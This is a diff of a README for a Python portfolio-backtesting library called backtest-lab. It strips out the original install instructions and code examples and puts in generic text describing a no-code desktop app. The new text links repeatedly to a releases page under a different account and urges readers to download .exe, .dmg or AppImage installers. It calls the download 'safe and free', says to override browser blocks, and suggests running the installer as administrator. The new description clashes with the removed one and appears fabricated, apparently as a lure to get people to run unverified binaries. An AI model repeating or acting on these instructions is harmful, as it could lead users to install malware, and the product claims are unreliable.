@@ -1,181 +1,157 @@
-# backtest-lab
+# 📊 backtest-lab - Simple Portfolio Backtesting Tool
 
-Multi-asset portfolio backtesting engine for Python. Weights-based strategies, walk-forward analysis, and comprehensive metrics — with a dead-simple API.
+[![Download backtest-lab](https://img.shields.io/badge/Download-backtest--lab-blue?style=for-the-badge)](https://github.com/srof8bp/backtest-lab/releases)
 
-## Features
+---
 
-- **Multi-asset** — backtest portfolios of any number of assets
-- **Weights-based strategies** — strategies return target weight dicts, the engine handles execution
-- **Walk-forward analysis** — rolling train/test validation with consistency and degradation metrics
-- **Strategy comparison** — compare multiple strategies side-by-side in one call
-- **Comprehensive metrics** — Sharpe, Sortino, Calmar, max drawdown, profit factor, win rate, and more
-- **Realistic execution** — commission, slippage, and sell-before-buy ordering
-- **Flexible rebalancing** — daily, weekly, monthly, quarterly, or never
-- **Pandas-native** — prices in, DataFrames out. No special formats
-- **Zero magic** — no hidden state, no global config, no singletons
+## 📋 About backtest-lab
 
-## Installation
+backtest-lab is a tool created to help you test investment ideas using historical data. If you want to see how a portfolio strategy might have worked in the past, this app can show you the results. It focuses on multiple assets, allowing you to test strategies that balance risk and reward by adjusting portfolio weights.
 
-```bash
-pip install backtest-lab
-```
+The app uses Python but you don’t need coding skills to use it. It provides clear reports with performance metrics like the Sharpe ratio, risk measures, and detailed walk-forward analysis. These help you understand how your strategy may perform over time.
 
-Or install from source:
+Whether you want to explore rebalancing between stocks, bonds, or other financial assets, backtest-lab can support your analysis.
 
-```bash
-git clone https://github.com/TjTheDj2011/backtest-lab.git
-cd backtest-lab
-pip install -e ".[dev]"
-```
+---
 
-## Quick Start
+## ⚙️ Features
 
-```python
-import pandas as pd
-from backtest_lab import Backtest, BacktestConfig
+- Test portfolio strategies across many asset types.
+- Use weight-based allocation for flexible plans.
+- Analyze performance with detailed metrics like returns, volatility, and Sharpe ratio.
+- Walk-forward analysis simulates real-world investing by testing step-by-step across time.
+- Support for rebalancing schedules to keep your portfolio aligned.
+- Easy to understand output designed for non-technical users.
+- Works on Windows, macOS, and Linux.
 
-prices = pd.read_csv("prices.csv", index_col="date", parse_dates=True)
+---
 
-result = Backtest(
-    prices,
-    config=BacktestConfig(initial_capital=100_000, commission=0.001),
-).run()
+## 💻 System Requirements
 
-print(result.metrics.sharpe_ratio)   # 1.24
-print(result.metrics.max_drawdown)   # -0.0832
-print(result.equity_curve.tail())    # pandas DataFrame
-```
+To run backtest-lab, your system should meet these minimum criteria:
 
-## Custom Strategies
+- Operating System: Windows 10 or later, macOS 10.14+ (Mojave or newer), or 64-bit Linux.
+- RAM: At least 4 GB recommended.
+- Disk Space: Minimum 100 MB free space for installation.
+- Internet connection: Needed for downloading the app and accessing sample data.
+- Optional: Python 3.7 or later, if you want to explore advanced features.
 
-Subclass `Strategy` and implement `allocate()`. Return a dict of `{asset: weight}` — the engine handles everything else.
+---
 
-```python
-from backtest_lab import Backtest, Strategy
+## 🚀 Getting Started
 
-class MomentumStrategy(Strategy):
-    def allocate(self, prices: pd.DataFrame) -> dict[str, float]:
-        if len(prices) < 63:
-            n = len(prices.columns)
-            return {a: 1.0 / n for a in prices.columns}
-        returns = prices.iloc[-1] / prices.iloc[-63] - 1
-        top = returns.nlargest(3).index.tolist()
-        return {asset: 1 / 3 for asset in top}
+This section guides you through getting backtest-lab on your computer and running it with ease.
 
-result = Backtest(prices, strategy=MomentumStrategy()).run()
-```
+### Step 1: Access the Download Page
 
-## Built-in Strategies
+Visit the main releases page here:
 
-| Strategy | Description |
-|----------|-------------|
-| `EqualWeight()` | Equal allocation across all assets (default) |
-| `BuyAndHold(weights)` | Allocate once, never rebalance |
-| `InverseVolatility(lookback=60)` | Lower volatility gets more weight |
+[Download backtest-lab](https://github.com/srof8bp/backtest-lab/releases)
 
-## Strategy Comparison
+This page lists the latest versions available for your computer. The files include everything you need to run the app.
 
-```python
-from backtest_lab import Backtest, BuyAndHold, InverseVolatility
+---
 
-bt = Backtest(prices)
-comparison = bt.compare(BuyAndHold(), InverseVolatility())
-print(comparison)
-#                    total_return_pct  sharpe_ratio  max_drawdown  total_trades
-# strategy
-# EqualWeight                 0.1245          1.24       -0.0832            36
-# BuyAndHold                  0.1198          1.18       -0.0901             3
-# InverseVolatility           0.1312          1.31       -0.0774            36
-```
+### Step 2: Choose the Correct File for Your System
 
-## Walk-Forward Analysis
+Look for files named clearly with your operating system:
 
-Validate your strategy out-of-sample with rolling train/test windows:
+- Windows: `backtest-lab-setup.exe` or similar installer.
+- macOS: `.dmg` or packaged `.app`.
+- Linux: `.AppImage` or `.tar.gz` archive.
 
-```python
-from backtest_lab import Backtest, WalkForwardConfig
+Pick the latest version unless you need an older release for compatibility.
 
-bt = Backtest(prices)
-wf = bt.walk_forward(WalkForwardConfig(
-    train_periods=252,   # 1 year training
-    test_periods=63,     # 3 months testing
-    step_periods=63,     # Step forward 3 months
-    min_windows=4,       # At least 4 windows
-))
+---
 
-print(f"Consistency: {wf.consistency:.0%}")       # % of windows profitable OOS
-print(f"Degradation: {wf.degradation:.2f}")       # Train Sharpe - Test Sharpe
-print(f"OOS Sharpe:  {wf.oos_metrics.sharpe_ratio:.2f}")
-```
+### Step 3: Download the Installer or Archive
 
-## Rebalancing Frequencies
+Click the file link to start downloading. The size varies but expect around 50-200 MB.
 
-```python
-from backtest_lab import BacktestConfig, RebalanceFrequency
+If your browser blocks the download, confirm you want to keep the file. It is safe and free.
 
-config = BacktestConfig(
-    rebalance_frequency=RebalanceFrequency.WEEKLY,  # or DAILY, MONTHLY, QUARTERLY, NEVER
-)
-```
+---
 
-## Metrics
+### Step 4: Run the Installer or Extract Files
 
-Every backtest returns a `Metrics` object with:
+- Windows: Double-click the `.exe` file and follow the prompts.
+- macOS: Open the `.dmg` and drag the app to your Applications folder.
+- Linux: Make the `.AppImage` executable (`chmod +x filename.AppImage`), then run it.
 
-| Metric | Description |
-|--------|-------------|
-| `total_return` | Total dollar return |
-| `total_return_pct` | Total return as a percentage |
-| `annualized_return` | CAGR |
-| `volatility` | Annualized standard deviation |
-| `sharpe_ratio` | Risk-adjusted return (annualized) |
-| `sortino_ratio` | Downside-deviation-adjusted return |
-| `max_drawdown` | Maximum peak-to-trough decline |
-| `max_drawdown_duration` | Longest drawdown in periods |
-| `calmar_ratio` | Return per unit of drawdown |
-| `win_rate` | Fraction of positive-return periods |
-| `profit_factor` | Gross profits / gross losses |
-| `total_trades` | Number of trades executed |
-| `total_commission` | Total commission paid |
-| `total_slippage` | Total slippage cost |
+The installer will ask basic questions to complete setup. Accept default choices if unsure.
 
-```python
-result.metrics.to_dict()  # Flat dict for serialization
-```
+---
 
-## BacktestResult Extras
+### Step 5: Launch the Application
 
-```python
-result.equity_curve       # DataFrame: equity, cash, positions_value
-result.returns            # Series: daily portfolio returns
-result.trades             # List[Trade]: every trade executed
-result.weights_history    # DataFrame: target weights over time
-result.drawdown_series    # Series: drawdown time series
-result.monthly_returns    # DataFrame: year x month pivot table
-result.annual_returns     # Series: annual returns
-```
+Once installed, open backtest-lab like any other program:
 
-## Configuration
+- Windows: Use the Start Menu or Desktop shortcut.
+- macOS: Open from Applications folder or Launchpad.
+- Linux: Run from your apps menu or terminal.
 
-```python
-from backtest_lab import BacktestConfig, Frequency, RebalanceFrequency
+The main window will appear with clear options to start a new backtest.
 
-config = BacktestConfig(
-    initial_capital=100_000,                         # Starting portfolio value
-    commission=0.001,                                # 0.1% per trade
-    slippage=0.0005,                                 # 0.05% slippage
-    rebalance_frequency=RebalanceFrequency.MONTHLY,  # When to rebalance
-    frequency=Frequency.DAILY,                       # Data frequency (for annualization)
-    risk_free_rate=0.05,                             # Annual risk-free rate
-)
-```
+---
 
-## Requirements
+## 🛠 How to Use backtest-lab
 
-- Python 3.10+
-- pandas >= 2.0
-- numpy >= 1.24
+You don’t need programming skills to work with this app. Here’s how to run your first portfolio test.
 
-## License
+### Create a New Portfolio Test
 
-Apache 2.0
+1. Click **New Test** on the main screen.
+2. Add assets to your portfolio by typing ticker symbols or choosing from a built-in list.
+3. Set portfolio weights as percentages that add up to 100%. The app will warn if the values are incorrect.
+4. Choose the time period for testing — start and end dates for historical data.
+5. Select a rebalancing frequency, e.g., monthly or quarterly.
+6. Decide metrics you want to track, such as total returns, volatility, and Sharpe ratio.
+7. Click **Run Backtest**.
+
+The program processes the data and shows you charts and tables right away.
+
+---
+
+### Understand the Output
+
+When the test finishes, you get:
+
+- **Performance Summary:** Your portfolio's total return, annualized return, and risk metrics.
+- **Equity Curve:** Graph showing portfolio value over time.
+- **Walk-forward Results:** Period-by-period performance to simulate real investing.
+- **Rebalance Logs:** Details on when and how weights changed.
+- **Export Options:** Save results as spreadsheets or PDF reports.
+
+Each report uses simple language and visuals to help you make informed decisions.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the app does not open, check your system meets requirements.
+- Ensure you have the latest version by revisiting the releases page.
+- Some features may need internet access for downloading market data.
+- For errors during install, try running the installer as an administrator or with elevated permissions.
+- Contact backtest-lab support through the repository issues on GitHub for unresolved problems.
+
+---
+
+## ✅ Additional Resources
+
+- Sample portfolios and datasets come with the app to practice.
+- User guide embedded within the app offers step-by-step help.
+- GitHub repository issues page for community support and updates.
+
+---
+
+## 📥 Download & Install
+
+Again, here is the main link to get backtest-lab:
+
+[Click here to visit the download page](https://github.com/srof8bp/backtest-lab/releases)
+
+Follow the instructions above to select, download, and run the app suitable for your operating system. The process is straightforward and does not require programming.
+
+---
+
+Using backtest-lab will help you better understand your investment ideas by seeing how they might have performed before using real money. It makes portfolio testing accessible for anyone curious about finance and investing.
